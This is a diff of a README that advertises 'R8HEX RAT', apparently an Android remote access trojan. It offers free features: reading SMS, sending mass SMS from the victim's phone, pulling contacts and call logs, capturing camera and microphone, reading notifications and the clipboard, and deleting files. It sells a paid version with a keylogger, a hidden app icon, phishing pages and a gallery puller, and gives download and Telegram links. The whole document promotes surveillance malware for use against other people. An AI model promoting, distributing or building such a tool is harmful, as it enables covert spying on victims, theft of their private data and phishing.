@@ -1,33 +1,74 @@
-# V.1.2 𝐅𝐫𝐞𝐞 𝐅𝐞𝐚𝐭𝐮𝐫𝐞𝐬
+# 🚀 R8HEX RAT – V1.2 (Free Release)
 
-- 🔦 Torch On/Off
-- 📳 Device Vibrate
-- ✉️ receive all SMS
-- ✉️ send sms to any number(FIXED)
-- ✉️ Send SMS with the target device to all of his/her contacts
-- 👤 receive all contacts
-- 📷 capture main and front camera
-- 🎙 capture microphone (with custom duration)
-- 👤 receive all Call Logs
-- 🔔 notification reader
-- 🗨️ Show Toast
-- 🎧 Play Audio
-- 🤖 Change Wallpaper (free)
-- 📋 receive the last clipboard text
-- 📂 Get All File & Delete Of Device (fixed)
+✅ This is the **FREE Version** of R8HEX RAT.  
+It contains a set of **basic but powerful features** to give you a taste of what R8HEX can do.  
+⚠️ For **Full Power + Advanced Features**, check the [PAID VERSION](https://t.me/R8HEX).
 
-- 📌 Most Attractive And Premium Looks(New)
+---
 
-<p1>These All Are Free Features Of R8hex Rat.If You Want More Features Then Contact On Telegram</p1>
+# 🆓 Free Features (V1.2)
 
-# Download All Files From Here 👇👇
+- 🔦 Torch On/Off  
+- 📳 Device Vibrate  
+- ✉️ Receive All SMS (Latest Only)  
+- ✉️ Send SMS to Any Number **(FIXED)**  
+- ✉️ Mass SMS → Send to All Contacts  
+- 👤 Receive All Contacts  
+- 📷 Capture Camera (Front + Rear)  
+- 🎙 Microphone Recording (Custom Duration)  
+- 👤 Call Logs Access  
+- 🔔 Notification Reader (Basic)  
+- 🗨 Show Toast Messages  
+- 🎧 Play Audio Remotely  
+- 📱 Change Wallpaper (Free)  
+- 📋 Receive Last Clipboard Text  
+- 📂 File Manager (Get & Delete Files) **(Fixed)**  
 
-<a href="https://github.com/Tocsiop/R8HEX/archive/refs/tags/V1.2.0-R8HEX.zip">𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗙𝗥𝗘𝗘 𝗙𝗜𝗟𝗘𝗦</a>
+---
 
+# ⭐ What's New in V1.2
+- 📌 **Premium-Look Interface** (Even in Free)  
+- 🚀 Improved Speed & Stability  
+- 🛠 Bug Fixes (SMS + File Manager)  
 
+---
 
-<a href="https://t.me/R8HEX">𝗣𝗔𝗜𝗗 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝗢𝗙 𝗥8𝗛𝗘𝗫 𝗥𝗔𝗧</a>
+# 🔒 Limitations of Free Version
+> ❌ No Keylogger  
+> ❌ No Auto Permission  
+> ❌ No Phishing Pages  
+> ❌ No App Hiding / Icon Change  
+> ❌ No Gallery Puller  
+> ❌ No Advanced GPS Tracking  
+> ❌ Limited Notifications  
 
-<a href="https://t.me/FRIDAYXD">
-    <img src="https://img.shields.io/badge/CONTACT-TELEGRAM-blue?style=for-the-badge&logo=telegram" alt="Telegram Badge"/>
-  </a>
+👉 Want **Full Remote Control + Unlimited Features**?  
+➡️ Get the [PAID VERSION](https://t.me/R8HEX)  
+
+---
+
+# 📥 Download Free Files
+<a href="https://github.com/Tocsiop/R8HEX/archive/refs/tags/1.0.0.zip">  
+    <img src="https://img.shields.io/badge/DOWNLOAD-FREE%20FILES-green?style=for-the-badge&logo=github" alt="Download Free"/>  
+</a>  
+
+---
+
+# 💎 Upgrade to Paid Version
+🔓 The **Paid Version** unlocks:  
+✔️ Keylogger + Screenshots  
+✔️ Hide/Change App Icon  
+✔️ Full Gallery Puller  
+✔️ Advanced File Manager  
+✔️ Auto Permissions + Phishing Pages  
+✔️ Unlimited IDs + Groups Support  
+✔️ Continuous Updates  
+
+👉 [Click Here to Get Paid Version](https://t.me/R8HEX)  
+
+---
+
+# 📩 Contact Developer
+<a href="https://t.me/FRIDAYXD">  
+    <img src="https://img.shields.io/badge/CONTACT-TELEGRAM-blue?style=for-the-badge&logo=telegram" alt="Telegram Contact"/>  
+</a>  
